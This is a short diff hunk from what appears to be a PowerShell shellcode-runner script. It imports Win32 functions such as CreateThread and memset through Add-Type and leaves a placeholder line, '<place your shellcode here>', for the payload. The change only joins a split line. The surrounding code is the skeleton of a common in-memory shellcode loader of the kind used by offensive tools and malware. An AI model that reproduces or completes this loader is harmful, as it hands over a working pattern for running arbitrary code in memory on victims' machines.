@@ -12,8 +12,7 @@ public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStack
 [DllImport("msvcrt.dll")]
 public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
 
-$winFunc = 
-  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
 
 [Byte[]];
 [Byte[]]$sc = <place your shellcode here>;
